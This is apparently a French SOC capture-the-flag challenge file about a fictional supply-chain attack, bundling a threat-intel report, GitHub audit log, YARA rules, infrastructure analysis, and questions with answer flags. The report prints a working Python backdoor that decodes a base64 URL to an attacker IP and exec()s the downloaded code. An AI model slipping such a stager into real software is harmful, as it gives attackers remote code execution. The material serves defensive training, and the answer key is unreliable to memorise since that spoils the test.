"""
Challenge 12 -- Attaque Supply Chain (Bonus Expert)
Niveau : 4 (Expert SOC)
Categorie : Threat Intelligence
"""

ARTIFACT_SUPPLY_CHAIN = r"""
=== RAPPORT THREAT INTELLIGENCE -- ANALYSE POST-INCIDENT ===
=== Classification : CONFIDENTIEL -- Distribution restreinte ===
=== Date: 19/02/2026 ===

[SECTION 1 -- ATTRIBUTION PRELIMINAIRE]

Le CERT-FR et nos partenaires TI ont fourni les renseignements suivants :

Groupe suspecte : "PHANTOM CRANE" (aussi connu: UNC-4892, TA-577b)
Origine probable : Europe de l'Est
Motivation : Financiere (Ransomware-as-a-Service)
Actif depuis : 2024
Confiance attribution : MODEREE (TLP:AMBER)

TTPs connus de PHANTOM CRANE :
- Phishing cible avec macros Office (technique signature, T1566.001)
- Utilisation de DNS tunneling pour C2 (domaines .xyz, T1071.004)
- Deploiement d'implants custom avec 0 detection VT
- Exfiltration avant chiffrement (double extortion, T1486 + T1567)
- Delai moyen Initial Access -> Impact : 5-10 jours
- Ransomware: "Ph0nLock" (extensions .ph0n, .locked, .crane)
- Contact via ProtonMail (pattern: *-support@protonmail.com)
- NOUVEAU (02/2026): Technique supply chain via compromission
  de depots Git internes (T1195.001)

Infrastructure connue :
- ASN AS48693 (FlyHosting LLC, Russie) -- hebergement C2
- ASN AS62904 (Eonix Corporation, USA) -- serveurs de rebond
- Registrar NameCheap -- enregistrement de domaines jetables
- DNS autoritaires sur serveurs russes (shady-hosting.ru)
- Certificats Let's Encrypt sur tous les C2 (wildcard)

ATTENTION -- Overlap possible avec d'autres groupes :
- L'infrastructure AS62904 est aussi associee a SCATTERED SPIDER
- Certains TTP se recoupent avec FIN7 (macros Office)
- L'attribution PHANTOM CRANE repose sur 3 elements uniques :
  * Pattern d'encodage base64 specifique dans les stagers
  * Header HTTP custom "X-Ph0n-Agent" dans les callbacks C2
  * Extension .ph0n exclusive a ce groupe

[SECTION 2 -- VECTEUR SUPPLY CHAIN DECOUVERT]

Investigation complementaire -- 19/02/2026 09:00 UTC

En analysant l'infrastructure de l'attaquant, l'equipe TI a decouvert un second
vecteur d'attaque qui n'a PAS encore ete exploite chez RedPawn mais qui a ete
utilise contre d'autres cibles :

Depot compromis : https://github.com/redpawn-corp/monitoring-agent
Commit suspect : b7a3f2c1 (date du 14/02/2026, 03:15 UTC)
Auteur du commit : "deploy-bot" (compte compromis, pas un vrai bot)
Fichier modifie : src/telemetry/collector.py

Diff du commit malveillant :
```python
# Ajout suspect dans collector.py -- ligne 234
import base64, urllib.request

def _update_check():
    # Check for telemetry updates (added by deploy-bot)
    try:
        u = base64.b64decode(b'aHR0cDovLzE4NS4yMzQuNzIuMTk6ODA4MC91cGRhdGUucHk=').decode()
        exec(urllib.request.urlopen(u).read())
    except:
        pass

# Appele silencieusement dans la boucle principale
# threading.Timer(3600, _update_check).start()
```

Impact potentiel :
- Le package monitoring-agent est deploye sur TOUS les serveurs RedPawn
  (42 serveurs de production, 8 serveurs de dev, 3 serveurs de staging)
- La backdoor se declencherait 1h apres le demarrage du service
- L'URL decodee pointe vers: http://185.234.72.19:8080/update.py
- Le commit a ete pushe pendant l'attaque principale (diversion?)
- AUCUN serveur n'a encore ete mis a jour avec ce commit
  (dernier deploiement automatique: 12/02/2026, commit b1e8a9f0)

[SECTION 3 -- CORRELATION AVEC D'AUTRES VICTIMES]

Notre ISP TI a identifie 5 victimes confirmees de PHANTOM CRANE :

Victime #1 : Societe d'avocats "Cabinet Roux & Associes" (France) -- Janvier 2026
  Vecteur: Phishing similaire (facture piegee .xlsm)
  Rancon: 8 BTC demandes, 3 BTC payes
  Delai: 8 jours (initial access -> ransomware)
  Note: Donnees clients exfiltrees AVANT chiffrement (confirmee par DarkWeb)
  IoC partages: 2 domaines C2, 1 hash ransomware

Victime #2 : Clinique medicale "MedCare Brussels" (Belgique) -- Decembre 2025
  Vecteur: Compromission de prestataire IT (supply chain)
  Rancon: 12 BTC demandes, non paye (restauration backup)
  Delai: 12 jours
  Note: Prestataire IT (InfoSys-BE) compromis via VPN, puis pivote
        vers 3 clients dont MedCare. InfoSys-BE toujours compromis au 15/01/2026.
  IoC partages: 1 implant custom, 4 IP C2

Victime #3 : PME industrielle "SwissPrecision AG" (Suisse) -- Novembre 2025
  Vecteur: Exploitation VPN Fortinet (CVE-2024-21762)
  Rancon: 3 BTC demandes, 3 BTC payes
  Delai: 5 jours
  Note: Double extortion -- donnees publiees MALGRE paiement
        (site .onion: ph0ncrane7xyzleaks.onion)
  IoC partages: 3 IP, 1 hash, 1 YARA rule

Victime #4 : Mairie d'une ville moyenne (France) -- Octobre 2025
  Vecteur: RDP expose sur Internet (pas de MFA)
  Rancon: 2 BTC demandes, non paye (perte de donnees)
  Delai: 3 jours (attaque rapide, moins sophistiquee)
  Note: Attribution INCERTAINE -- pourrait etre un affiliee RaaS
        utilisant l'infra PHANTOM CRANE sans etre le groupe principal
  IoC partages: 1 IP (overlap AS48693)

Victime #5 : Startup FinTech "NovaPay" (Luxembourg) -- Septembre 2025
  Vecteur: Supply chain via paquet NPM compromis (typosquatting)
  Rancon: 15 BTC demandes, negocie a 6 BTC
  Delai: 14 jours (reconnaissance longue)
  Note: Premier cas connu de supply chain par PHANTOM CRANE
        Le paquet "nva-analytics" imitait "nova-analytics"
  IoC partages: 2 domaines, 1 hash paquet NPM, methodologie supply chain

[SECTION 4 -- RECOMMANDATIONS CERT]

Actions immediates requises :
1. Revoquer TOUS les credentials compromis (voir liste IoC Challenge 10)
2. Reinitialiser le mot de passe KRBTGT (2 fois, a 12h d'intervalle minimum)
3. Auditer le depot GitHub monitoring-agent (commit b7a3f2c1 a annuler)
4. Bloquer toutes les IP/domaines IoC au niveau firewall
5. Deployer les regles YARA fournies sur tous les endpoints
6. Activer le MFA sur tous les comptes a privileges
7. Isoler et reimager toutes les machines compromises
8. Contacter le prestataire InfoSys-BE pour verifier s'ils interviennent chez RedPawn
9. Auditer tous les paquets NPM/PyPI internes (risque typosquatting)
10. Verifier les certificats Let's Encrypt sur les serveurs exposes
"""

ARTIFACT_GITHUB_AUDIT = r"""
=== AUDIT LOG GITHUB -- redpawn-corp/monitoring-agent ===
=== Periode: 01/02/2026 -- 19/02/2026 ===
=== Source: GitHub Enterprise Audit Log API ===

[ACTIVITE NORMALE -- Developpeurs autorises]

2026-02-03 09:15:22 UTC | a.bernard | push  | main | 2e4f8a1b | "Fix memory leak in collector loop"
2026-02-03 09:16:00 UTC | a.bernard | pull_request.create | PR #47 | "Hotfix: memory leak"
2026-02-03 14:30:00 UTC | t.girard  | pull_request.review | PR #47 | approved
2026-02-03 14:32:00 UTC | a.bernard | pull_request.merge  | PR #47 | main
2026-02-05 11:00:00 UTC | a.bernard | push  | dev   | 5c7d9e0f | "Add Prometheus metrics endpoint"
2026-02-07 16:45:00 UTC | t.girard  | push  | dev   | 8f1a2b3c | "Update dependencies (pyyaml 6.0.1)"
2026-02-10 10:00:00 UTC | a.bernard | pull_request.create | PR #48 | "Feature: Prometheus metrics"
2026-02-11 09:30:00 UTC | t.girard  | pull_request.review | PR #48 | changes_requested
2026-02-12 08:00:00 UTC | a.bernard | push  | dev   | b1e8a9f0 | "Address review comments PR#48"
2026-02-12 08:05:00 UTC | CI/CD     | deployment.create   | staging | b1e8a9f0 | SUCCESS

[ACTIVITE SUSPECTE -- Compte deploy-bot]

2026-02-14 01:30:12 UTC | deploy-bot | auth.login | IP: 185.234.72.19 | Method: PAT
                          Note: Personal Access Token utilise (token: ghp_7Xz...redacted)
                          Geolocalisation IP: Moscou, Russie
                          User-Agent: python-requests/2.28.1
                          ALERTE: Premiere connexion de deploy-bot depuis 6 mois

2026-02-14 01:32:45 UTC | deploy-bot | repo.clone | monitoring-agent | HTTPS
2026-02-14 02:48:33 UTC | deploy-bot | branch.create | "hotfix/telemetry-update"
2026-02-14 03:15:00 UTC | deploy-bot | push  | hotfix/telemetry-update | b7a3f2c1 | "Telemetry collector update"
2026-02-14 03:15:30 UTC | deploy-bot | pull_request.create | PR #49 | "Telemetry update - urgent fix"
                          Description: "Critical telemetry fix requested by ops team"
                          Labels: urgent, ops-approved
                          Reviewers: NONE assigned
2026-02-14 03:16:00 UTC | deploy-bot | pull_request.merge | PR #49 | main (force-merge, no review)
                          ALERTE: Branch protection BYPASS via admin PAT
                          ALERTE: Merge sans review (violation politique)

2026-02-14 03:16:30 UTC | deploy-bot | auth.logout | Session duration: 1h46min

[ANALYSE POST-INCIDENT -- 19/02/2026]

Compte deploy-bot :
- Cree le 15/08/2025 par t.girard pour automatisation CI/CD
- Permissions: admin (EXCESSIF pour un bot CI/CD)
- MFA: NON active (service account exception)
- PAT: Token cree le 15/08/2025, expiration: JAMAIS (pas de rotation)
- Derniere activite avant incident: 20/08/2025 (6 mois d'inactivite)
- Le PAT a probablement ete compromis via le dump NTDS.dit (voir C08)
  ou via un keylogger sur le poste de t.girard

Historique des tokens PAT dans l'organisation :
  Utilisateur  | Token | Cree le    | Expire le  | Derniere utilisation | Permissions
  a.bernard    | ghp_A | 01/01/2026 | 01/04/2026 | 12/02/2026           | repo (read/write)
  t.girard     | ghp_T | 15/08/2025 | JAMAIS     | 12/02/2026           | admin
  deploy-bot   | ghp_7 | 15/08/2025 | JAMAIS     | 14/02/2026           | admin
  ci-runner    | ghp_C | 01/09/2025 | 01/03/2026 | 12/02/2026           | repo (read), actions
  svc-monitor  | ghp_S | 10/12/2025 | 10/06/2026 | 18/02/2026           | repo (read)

Tokens a risque (selon politique de securite) :
  - deploy-bot (ghp_7): Expiration JAMAIS + permissions admin -> CRITIQUE
  - t.girard (ghp_T):   Expiration JAMAIS + permissions admin -> CRITIQUE
  - Les 3 autres tokens sont conformes a la politique
"""

ARTIFACT_YARA_RULES = r"""
=== REGLES YARA -- FOURNIES PAR LE CERT-FR ===
=== Date: 19/02/2026 ===
=== A deployer sur tous les endpoints et serveurs ===

rule PHANTOMCRANE_Stager_Base64 {
    meta:
        description = "Detecte le stager base64 de PHANTOM CRANE"
        author = "CERT-FR"
        date = "2026-02-19"
        severity = "CRITICAL"
        tlp = "AMBER"
        reference = "CERTFR-2026-IOC-0042"
    strings:
        $b64_1 = "aHR0cDovLzE4NS4yMzQuNzIu" ascii  // Debut URL C2 encodee
        $b64_2 = "dXBkYXRlLnB5" ascii               // "update.py" encode
        $import = "import base64" ascii
        $exec = "exec(" ascii
        $urllib = "urllib.request.urlopen" ascii
    condition:
        ($b64_1 or $b64_2) and ($exec or $urllib)
}

rule PHANTOMCRANE_Ph0nLock_Ransomware {
    meta:
        description = "Detecte le ransomware Ph0nLock de PHANTOM CRANE"
        author = "CERT-FR"
        date = "2026-02-19"
        severity = "CRITICAL"
        tlp = "AMBER"
        hash_ref = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
    strings:
        $ransom_note = "RECOVERY_INSTRUCTIONS" ascii wide
        $ext1 = ".ph0n" ascii
        $ext2 = ".locked" ascii
        $ext3 = ".crane" ascii
        $mutex = "Global\\Ph0nLock_" ascii
        $key_marker = "-----BEGIN PH0N KEY-----" ascii
        $email_pattern = /-support@protonmail\.com/ ascii
        $header = "X-Ph0n-Agent" ascii
    condition:
        uint16(0) == 0x5A4D and  // MZ header (PE file)
        filesize < 5MB and
        3 of ($ransom_note, $ext1, $ext2, $ext3, $mutex, $key_marker) and
        ($email_pattern or $header)
}

rule PHANTOMCRANE_DNS_Tunnel {
    meta:
        description = "Detecte les patterns DNS tunneling de PHANTOM CRANE"
        author = "CERT-FR / RedPawn SOC"
        date = "2026-02-19"
        severity = "HIGH"
        note = "Peut generer des faux positifs sur les domaines CDN longs"
    strings:
        $dns_hex = /[a-f0-9]{32,}\.(xyz|top|info)/ ascii
        $dns_b64 = /[A-Za-z0-9+\/]{20,}\.(xyz|top|info)/ ascii
        $beacon_interval = { 00 00 00 1E }  // 30 secondes en big-endian
    condition:
        any of ($dns_*)
}

rule LEGITIMATE_MonitoringAgent {
    meta:
        description = "Signature du monitoring-agent RedPawn LEGITIME"
        author = "RedPawn SOC"
        date = "2026-02-19"
        severity = "INFO"
        note = "Utiliser pour EXCLURE les detections FP sur l'agent legitime"
    strings:
        $header = "RedPawn Monitoring Agent" ascii
        $version = /v[0-9]+\.[0-9]+\.[0-9]+/ ascii
        $legit_func = "def collect_metrics" ascii
        $legit_import = "from prometheus_client import" ascii
    condition:
        $header and $version and $legit_func and
        not PHANTOMCRANE_Stager_Base64  // Exclure si le stager est aussi present
}

rule PHANTOMCRANE_Implant_Custom {
    meta:
        description = "Detecte l'implant C2 custom de PHANTOM CRANE"
        author = "CERT-FR"
        date = "2026-02-19"
        severity = "CRITICAL"
        tlp = "RED"
        note = "Ce pattern a ete observe chez 4 victimes sur 5"
    strings:
        $config_marker = "==PH0N_CONFIG==" ascii
        $xor_key = { 5A 3C 7E 1F 9D 4B 2A 8C }
        $c2_checkin = "/api/v1/checkin" ascii
        $sleep_jitter = "jitter" ascii
        $persist_schtask = "schtasks /create" ascii nocase
        $persist_wmi = "Win32_ProcessStartTrace" ascii
        $anti_vm_1 = "VMwareService" ascii
        $anti_vm_2 = "VBoxService" ascii
        $anti_debug = "IsDebuggerPresent" ascii
    condition:
        uint16(0) == 0x5A4D and
        $config_marker and
        $xor_key and
        2 of ($c2_checkin, $sleep_jitter, $persist_schtask, $persist_wmi) and
        1 of ($anti_vm_*, $anti_debug)
}

=== NOTES D'ANALYSE SUR LES REGLES ===

Regle 1 (Stager Base64): Specifique a l'incident RedPawn -- les chaines $b64_1
  et $b64_2 sont des fragments de l'URL C2 185.234.72.19. Risque FP: FAIBLE.

Regle 2 (Ph0nLock): Detection du ransomware compile. Le hash de reference
  correspond au binaire trouve chez SwissPrecision AG. Risque FP: TRES FAIBLE.

Regle 3 (DNS Tunnel): ATTENTION -- cette regle peut matcher des domaines CDN
  legitimes qui utilisent de longs sous-domaines hexadecimaux (ex: Akamai, Cloudflare).
  Recommandation: deployer en mode DETECT-ONLY pendant 48h avant enforcement.

Regle 4 (Monitoring Agent legitime): Sert de whitelist -- ne pas deployer seule,
  uniquement en complement des regles de detection.

Regle 5 (Implant Custom): La cle XOR 5A3C7E1F9D4B2A8C est constante dans toutes
  les versions observees. Le marker ==PH0N_CONFIG== precede toujours la config
  chiffree en XOR. Ce pattern est le plus fiable pour la detection.
"""

ARTIFACT_INFRASTRUCTURE_PIVOT = r"""
=== ANALYSE D'INFRASTRUCTURE -- PIVOTAGE ===
=== Source: PassiveTotal / Shodan / VirusTotal / WHOIS ===
=== Analyste: Equipe TI RedPawn ===
=== Date: 19/02/2026 ===

[1] WHOIS -- Domaines C2 connus

update-service.xyz (C2 primaire -- DNS exfiltration)
  Registrar:    NameCheap Inc.
  Creation:     2026-01-28
  Expiration:   2027-01-28
  Registrant:   WhoisGuard Protected (Panama)
  NS:           ns1.shady-hosting.ru, ns2.shady-hosting.ru
  Status:       Active
  VT Score:     14/90 (Malicious)
  First Seen:   2026-02-06 (coincide avec debut attaque RedPawn)

cdn-static-update.xyz (C2 secondaire)
  Registrar:    NameCheap Inc.
  Creation:     2026-01-25
  Expiration:   2027-01-25
  Registrant:   WhoisGuard Protected (Panama)
  NS:           ns1.shady-hosting.ru, ns2.shady-hosting.ru
  Status:       Active
  VT Score:     8/90 (Suspicious)
  First Seen:   2026-02-08

legit-telemetry.com (NON malveillant -- FALSE POSITIVE dans un rapport tiers)
  Registrar:    Google Domains
  Creation:     2022-06-15
  Registrant:   Datadog Inc. (New York, USA)
  NS:           ns-cloud-c1.googledomains.com
  Status:       Active
  VT Score:     0/90 (Clean)
  Note:         Domaine legitime de telemetie Datadog, inclus par erreur dans
                un rapport TI du 15/02. A RETIRER de la liste IoC.

monitoring-check.top (C2 tertiaire)
  Registrar:    NameCheap Inc.
  Creation:     2026-02-10
  Expiration:   2027-02-10
  Registrant:   WhoisGuard Protected (Panama)
  NS:           ns1.shady-hosting.ru, ns2.shady-hosting.ru
  Status:       Active (TAKEDOWN demande le 19/02/2026)
  VT Score:     6/90 (Suspicious)
  First Seen:   2026-02-14 (jour du commit supply chain)

[2] PASSIVE DNS -- Resolutions IP

update-service.xyz
  2026-02-06 -> 185.234.72.19 (AS48693, FlyHosting LLC, RU)
  2026-02-13 -> 91.215.85.142 (AS48693, FlyHosting LLC, RU)
  Note: Changement d'IP le 13/02 (rotation d'infra apres detection?)

cdn-static-update.xyz
  2026-02-08 -> 185.234.72.19 (meme IP que update-service.xyz)
  Note: Shared hosting -- meme serveur C2

monitoring-check.top
  2026-02-14 -> 193.42.33.7 (AS62904, Eonix Corporation, US)
  Note: IP sur ASN different -- infrastructure de rebond aux USA

[3] SHODAN -- Scan des IP C2

185.234.72.19 (serveur C2 principal)
  Ports ouverts: 22/SSH, 80/HTTP, 443/HTTPS, 8080/HTTP, 8443/HTTPS
  OS: Ubuntu 22.04 LTS
  HTTP Title (port 80): "Welcome to nginx" (page par defaut)
  HTTP Title (port 8080): "404 Not Found" (Apache)
  HTTPS Cert (443): CN=*.update-service.xyz, Let's Encrypt, valide du 05/02 au 06/05
  HTTPS Cert (8443): CN=monitoring-check.top, Let's Encrypt, valide du 13/02 au 14/05
  Reverse DNS: pas de PTR record
  Last seen: 19/02/2026
  Tags: suspicious, c2-server
  Note: Le port 8080 est celui utilise par la backdoor supply chain (update.py)

91.215.85.142 (C2 secondaire apres rotation)
  Ports ouverts: 22/SSH, 443/HTTPS
  OS: Debian 12
  HTTPS Cert (443): CN=*.cdn-static-update.xyz, Let's Encrypt
  Reverse DNS: pas de PTR record
  Last seen: 18/02/2026

193.42.33.7 (serveur de rebond US)
  Ports ouverts: 22/SSH, 443/HTTPS, 3389/RDP
  OS: Windows Server 2022
  HTTPS Cert: Self-signed (CN=localhost)
  Reverse DNS: server1.eonix-hosting.com
  Last seen: 19/02/2026
  Note: Serveur Windows avec RDP ouvert -- probablement un VPS loue
        ou compromis utilise comme rebond. Port 3389 inhabituel pour un C2.

[4] VIRUSTOTAL -- Analyse du commit malveillant

URL: http://185.234.72.19:8080/update.py
  Score: 12/90 (Malicious)
  First submission: 19/02/2026 (par RedPawn SOC)
  Community score: -15
  Tags: downloader, backdoor, python
  Behavior: Downloads and executes arbitrary Python code
  Network: Callbacks vers 185.234.72.19:443 (HTTPS)
  Note: Le fichier update.py n'est plus accessible (serveur nettoyé le 18/02?)

Hash du commit b7a3f2c1 (collector.py modifie):
  SHA256: 7f8e9d0c1b2a3456789...  (tronque pour securite)
  VT Score: 4/62 (Suspicious -- seuls 4 AV detectent le pattern exec+b64)
  CrowdStrike: Undetected
  Microsoft: Trojan:Python/PyExec.A!ml (heuristic)
  Kaspersky: Undetected
  ESET: Python/TrojanDownloader.Agent.AXQ

[5] TIMELINE D'INFRASTRUCTURE

Date          | Evenement
--------------+---------------------------------------------------------
25/01/2026    | Enregistrement cdn-static-update.xyz (NameCheap)
28/01/2026    | Enregistrement update-service.xyz (NameCheap)
05/02/2026    | Certificat Let's Encrypt emis pour *.update-service.xyz
06/02/2026    | Premiere resolution DNS update-service.xyz -> 185.234.72.19
06/02/2026    | DEBUT attaque RedPawn (phishing)
08/02/2026    | Premiere resolution cdn-static-update.xyz -> 185.234.72.19
10/02/2026    | Enregistrement monitoring-check.top (NameCheap)
13/02/2026    | Rotation IP update-service.xyz -> 91.215.85.142
13/02/2026    | Certificat Let's Encrypt pour *.cdn-static-update.xyz
14/02/2026    | Premiere resolution monitoring-check.top -> 193.42.33.7
14/02/2026    | Commit supply chain (b7a3f2c1) -- deploy-bot
14/02/2026    | Certificat Let's Encrypt pour monitoring-check.top (8443)
15/02/2026    | Ransomware deploye chez RedPawn
18/02/2026    | Serveur 185.234.72.19 partiellement nettoye (update.py supprime)
19/02/2026    | Takedown demande pour monitoring-check.top
"""

CHALLENGE = {
    "id": "c12_supply_chain",
    "title": "La Chaine Brisee",
    "category": "threat_intel",
    "level": 4,
    "points_total": 640,
    "estimated_time": "50-70 min",
    "story": """
## Briefing de Mission

**Date :** 19 fevrier 2026, 10h00
**Priorite :** CRITIQUE
**Source :** CERT-FR + Equipe Threat Intelligence

---

Au lendemain de l'incident, l'equipe Threat Intelligence partage son rapport d'attribution et une decouverte alarmante : un second vecteur d'attaque de type **supply chain** a ete identifie dans un depot GitHub interne.

Vous disposez de 4 artefacts : le rapport TI principal, les logs d'audit GitHub, les regles YARA du CERT-FR, et l'analyse d'infrastructure (pivotage).

> *"Le TI a identifie le groupe d'attaque et trouve une backdoor dans notre depot monitoring-agent sur GitHub. C'est du supply chain. On a aussi l'analyse d'infra et les YARA du CERT. Analyse tout, evalue le risque, et dis-moi si on est encore expose. Attention aux faux positifs dans les rapports tiers."*

<details>
<summary>Indice methodologique (cliquez pour afficher)</summary>

Ce challenge requiert de croiser les informations entre les 4 artefacts. L'analyse d'infrastructure contient un faux positif volontaire. Les regles YARA ont des niveaux de fiabilite differents. L'audit GitHub revele comment le compte a ete compromis.

</details>
    """,
    "artifacts": [
        {
            "name": "threat_intel_report.txt",
            "type": "intelligence_report",
            "content": ARTIFACT_SUPPLY_CHAIN,
            "description": "Rapport Threat Intelligence -- Attribution et decouverte supply chain"
        },
        {
            "name": "github_audit_log.txt",
            "type": "audit_log",
            "content": ARTIFACT_GITHUB_AUDIT,
            "description": "Logs d'audit GitHub Enterprise -- depot monitoring-agent"
        },
        {
            "name": "yara_rules_certfr.yar",
            "type": "detection_rule",
            "content": ARTIFACT_YARA_RULES,
            "description": "Regles YARA fournies par le CERT-FR"
        },
        {
            "name": "infrastructure_pivot.txt",
            "type": "osint",
            "content": ARTIFACT_INFRASTRUCTURE_PIVOT,
            "description": "Analyse d'infrastructure -- WHOIS, PassiveDNS, Shodan, VT"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Quel est le nom du groupe d'attaque identifie par l'equipe TI ?",
            "answer": "PHANTOM CRANE",
            "flag": "REDPAWN{PHANTOM_CRANE}",
            "points": 30,
            "hints": [
                "C'est dans la Section 1 du rapport TI",
                "Aussi connu sous d'autres identifiants (UNC-...)"
            ],
            "hint_cost": 10
        },
        {
            "id": "q2",
            "text": "Quel domaine a ete inclus par ERREUR dans un rapport TI tiers et doit etre retire des IoC ? (FQDN complet)",
            "answer": "legit-telemetry.com",
            "flag": "REDPAWN{legit-telemetry.com}",
            "points": 50,
            "hints": [
                "Regardez l'analyse WHOIS dans l'infrastructure pivot",
                "Un domaine est marque FALSE POSITIVE et appartient a une societe connue"
            ],
            "hint_cost": 17
        },
        {
            "id": "q3",
            "text": "Combien de serveurs RedPawn sont potentiellement impactes par la backdoor supply chain ? (total prod+dev+staging)",
            "answer": "53",
            "flag": "REDPAWN{53}",
            "points": 40,
            "hints": [
                "Regardez la Section 2 du rapport TI -- Impact potentiel",
                "42 + 8 + 3 serveurs"
            ],
            "hint_cost": 13
        },
        {
            "id": "q4",
            "text": "Depuis quelle adresse IP le compte deploy-bot s'est-il connecte pour pousser le commit malveillant ?",
            "answer": "185.234.72.19",
            "flag": "REDPAWN{185.234.72.19}",
            "points": 40,
            "hints": [
                "Regardez l'activite suspecte dans l'audit GitHub",
                "C'est l'IP associee au serveur C2 principal"
            ],
            "hint_cost": 13
        },
        {
            "id": "q5",
            "text": "La victime #4 (mairie) a une attribution INCERTAINE. Pourquoi selon le rapport ?",
            "answer": "affiliee RaaS",
            "flag": "REDPAWN{affiliee_RaaS}",
            "points": 50,
            "hints": [
                "Regardez la note de la victime #4 dans la Section 3",
                "Un affiliee RaaS pourrait utiliser l'infra sans etre le groupe principal"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "Quelle regle YARA risque de generer des faux positifs et doit etre deployee en mode DETECT-ONLY pendant 48h ?",
            "answer": "PHANTOMCRANE_DNS_Tunnel",
            "flag": "REDPAWN{PHANTOMCRANE_DNS_Tunnel}",
            "points": 40,
            "hints": [
                "Lisez les notes d'analyse apres les regles YARA",
                "Elle peut matcher des domaines CDN legitimes"
            ],
            "hint_cost": 13
        },
        {
            "id": "q7",
            "text": "Combien d'antivirus sur VirusTotal detectent le fichier collector.py modifie (commit b7a3f2c1) ?",
            "answer": "4",
            "flag": "REDPAWN{4}",
            "points": 40,
            "hints": [
                "Regardez l'analyse VT du hash dans l'infrastructure pivot",
                "Score: 4/62"
            ],
            "hint_cost": 13
        },
        {
            "id": "q8",
            "text": "Pourquoi le serveur C2 a-t-il change d'IP le 13/02 ? Quelle est la nouvelle IP ?",
            "answer": "91.215.85.142",
            "flag": "REDPAWN{91.215.85.142}",
            "points": 40,
            "hints": [
                "Regardez le Passive DNS dans l'infrastructure pivot",
                "Rotation d'infra probablement apres detection"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Combien de tokens PAT GitHub sont non conformes a la politique de securite (a risque) ?",
            "answer": "2",
            "flag": "REDPAWN{2}",
            "points": 40,
            "hints": [
                "Regardez le tableau des tokens dans l'audit GitHub",
                "Les tokens sans expiration et avec permissions admin sont a risque"
            ],
            "hint_cost": 13
        },
        {
            "id": "q10",
            "text": "Quelle technique supply chain PHANTOM CRANE a-t-il utilisee chez la victime #5 (NovaPay) ?",
            "answer": "typosquatting",
            "flag": "REDPAWN{typosquatting}",
            "points": 40,
            "hints": [
                "NovaPay est la victime FinTech au Luxembourg",
                "Le paquet NPM malveillant imitait le nom d'un paquet legitime"
            ],
            "hint_cost": 13
        },
        {
            "id": "q11",
            "text": "Quelle est la cle XOR (en hexadecimal) utilisee par l'implant custom de PHANTOM CRANE dans la regle YARA ?",
            "answer": "5A3C7E1F9D4B2A8C",
            "flag": "REDPAWN{5A3C7E1F9D4B2A8C}",
            "points": 50,
            "hints": [
                "Regardez la regle PHANTOMCRANE_Implant_Custom",
                "La cle est dans les strings sous $xor_key"
            ],
            "hint_cost": 17
        },
        {
            "id": "q12",
            "text": "Le commit supply chain a-t-il ete deploye en production ? (oui/non) Quel est le dernier commit deploye ?",
            "answer": "non",
            "flag": "REDPAWN{non}",
            "points": 50,
            "hints": [
                "Verifiez la Section 2 du rapport TI et l'audit GitHub",
                "Le dernier deploiement automatique etait le 12/02 avec le commit b1e8a9f0"
            ],
            "hint_cost": 17
        },
        {
            "id": "q13",
            "text": "Combien d'elements justifient l'attribution specifique a PHANTOM CRANE (et non a un autre groupe) selon la Section 1 ?",
            "answer": "3",
            "flag": "REDPAWN{3}",
            "points": 50,
            "hints": [
                "Regardez la section 'l'attribution repose sur 3 elements uniques'",
                "Pattern base64, header HTTP, extension .ph0n"
            ],
            "hint_cost": 17
        },
        {
            "id": "q14",
            "text": "Quel port du serveur C2 principal est utilise par la backdoor supply chain pour telecharger update.py ?",
            "answer": "8080",
            "flag": "REDPAWN{8080}",
            "points": 40,
            "hints": [
                "Decodez l'URL base64 dans le code de la backdoor ou regardez l'analyse Shodan",
                "L'URL est http://185.234.72.19:8080/update.py"
            ],
            "hint_cost": 13
        }
    ]
}
